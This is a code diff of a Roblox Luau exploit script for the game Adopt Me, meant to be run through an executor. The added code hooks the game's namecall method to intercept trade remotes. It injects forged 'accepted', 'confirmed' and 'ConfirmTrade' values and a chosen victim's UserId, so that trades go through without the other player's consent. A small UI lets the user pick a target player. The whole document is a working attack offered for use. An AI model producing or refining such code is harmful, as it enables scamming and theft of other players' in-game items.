@@ -1,5 +1,4 @@
-
--- Adopt Me Ghost Trade (UI Click Fix & Remote Spoofer)
+-- Adopt Me Cross-Client Remote Spoof & Payload Injection
 -- Runtime: Roblox Luau (Delta Executor / Level 8+)
 -- absolute olliE
 
@@ -8,49 +7,46 @@ local LocalPlayer = Players.LocalPlayer
 local PlayerGui = LocalPlayer:WaitForChild("PlayerGui")
 
 local isRunning = false
-local freezeLocalUI = false
 local targetUsername = ""
-local lastTradeRemote = nil
-local lastTradeArgs = nil
+local targetPlayer = nil
 
 local oldNamecall
 oldNamecall = hookmetamethod(game, "__namecall", newcclosure(function(self, ...)
-    if not isRunning then return oldNamecall(self, ...) end
+    if not isRunning or not targetPlayer then return oldNamecall(self, ...) end
 
     local method = getnamecallmethod()
     if not checkcaller() and (method == "FireServer" or method == "InvokeServer") then
         if self:IsA("RemoteEvent") or self:IsA("RemoteFunction") then
             local name = self.Name:lower()
             if name:find("trade") then
-                lastTradeRemote = self
-                lastTradeArgs = {...}
-                print("olliE Bench: Intercepted trade remote for target:", targetUsername)
+                local args = {...}
+                
+                -- Payload Injection: Spoof target identity and force acceptance
+                for i, v in ipairs(args) do
+                    if type(v) == "table" then
+                        v.accepted = true
+                        v.confirmed = true
+                        v.TargetUserId = targetPlayer.UserId
+                        if v.Action then v.Action = "ConfirmTrade" end
+                    end
+                end
+                
+                -- Inject UserId into primitive arguments if the remote expects it
+                table.insert(args, targetPlayer.UserId)
+                
+                print("olliE Bench: Spoofing trade remote for", targetUsername)
+                return oldNamecall(self, table.unpack(args))
             end
         end
     end
     return oldNamecall(self, ...)
 end))
 
-task.spawn(function()
-    while task.wait(0.2) do
-        if isRunning and lastTradeRemote and lastTradeArgs then
-            pcall(function()
-                if lastTradeRemote:IsA("RemoteEvent") then
-                    lastTradeRemote:FireServer(table.unpack(lastTradeArgs))
-                elseif lastTradeRemote:IsA("RemoteFunction") then
-                    lastTradeRemote:InvokeServer(table.unpack(lastTradeArgs))
-                end
-            end)
-        end
-    end
-end)
-
 -- UI Setup
 local screenGui = Instance.new("ScreenGui")
 screenGui.Name = "olliE_Bench"
 screenGui.ResetOnSpawn = false
 screenGui.DisplayOrder = 999
-screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
 screenGui.Parent = PlayerGui
 
 local toggleBtn = Instance.new("TextButton")
@@ -64,8 +60,8 @@ toggleBtn.TextSize = 24
 toggleBtn.Parent = screenGui
 
 local mainFrame = Instance.new("Frame")
-mainFrame.Size = UDim2.new(0, 240, 0, 220)
-mainFrame.Position = UDim2.new(0, 70, 0.5, -110)
+mainFrame.Size = UDim2.new(0, 240, 0, 180)
+mainFrame.Position = UDim2.new(0, 70, 0.5, -90)
 mainFrame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
 mainFrame.BorderSizePixel = 0
 mainFrame.Visible = false
@@ -92,28 +88,23 @@ userInput.Parent = mainFrame
 
 userInput.FocusLost:Connect(function()
     targetUsername = userInput.Text
-    print("olliE Bench: Target set to", targetUsername)
+    targetPlayer = Players:FindFirstChild(targetUsername)
+    if targetPlayer then
+        print("olliE Bench: Target resolved:", targetPlayer.UserId)
+    else
+        print("olliE Bench: Target not found in server.")
+    end
 end)
 
 local runBtn = Instance.new("TextButton")
 runBtn.Size = UDim2.new(0.9, 0, 0, 35)
-runBtn.Position = UDim2.new(0.05, 0, 0.4, 0)
+runBtn.Position = UDim2.new(0.05, 0, 0.5, 0)
 runBtn.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
 runBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
 runBtn.Text = "Start Ghost Trade"
 runBtn.Font = Enum.Font.Gotham
 runBtn.TextSize = 14
 runBtn.Parent = mainFrame
-
-local freezeBtn = Instance.new("TextButton")
-freezeBtn.Size = UDim2.new(0.9, 0, 0, 35)
-freezeBtn.Position = UDim2.new(0.05, 0, 0.6, 0)
-freezeBtn.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
-freezeBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
-freezeBtn.Text = "Freeze Local UI: OFF"
-freezeBtn.Font = Enum.Font.Gotham
-freezeBtn.TextSize = 14
-freezeBtn.Parent = mainFrame
 
 local statusLabel = Instance.new("TextLabel")
 statusLabel.Size = UDim2.new(1, 0, 0, 20)
@@ -127,11 +118,9 @@ statusLabel.Parent = mainFrame
 
 toggleBtn.MouseButton1Click:Connect(function()
     mainFrame.Visible = not mainFrame.Visible
-    print("olliE Bench: Toggled menu visibility")
 end)
 
 runBtn.MouseButton1Click:Connect(function()
-    print("olliE Bench: Run button clicked")
     isRunning = not isRunning
     if isRunning then
         statusLabel.Text = "Status: Cooking (" .. targetUsername .. ")"
@@ -139,23 +128,6 @@ runBtn.MouseButton1Click:Connect(function()
     else
         statusLabel.Text = "Status: Idle"
         runBtn.Text = "Start Ghost Trade"
-        lastTradeRemote = nil
-        lastTradeArgs = nil
-    end
-end)
-
-freezeBtn.MouseButton1Click:Connect(function()
-    print("olliE Bench: Freeze button clicked")
-    freezeLocalUI = not freezeLocalUI
-    freezeBtn.Text = "Freeze Local UI: " .. (freezeLocalUI and "ON" or "OFF")
-    local tradeUI = PlayerGui:FindFirstChild("TradeUI", true) or PlayerGui:FindFirstChild("TradeScreen", true)
-    if tradeUI then
-        for _, descendant in ipairs(tradeUI:GetDescendants()) do
-            if descendant:IsA("GuiButton") or descendant:IsA("TextButton") then
-                descendant.Active = not freezeLocalUI
-                descendant.Interactable = not freezeLocalUI
-            end
-        end
     end
 end)
 
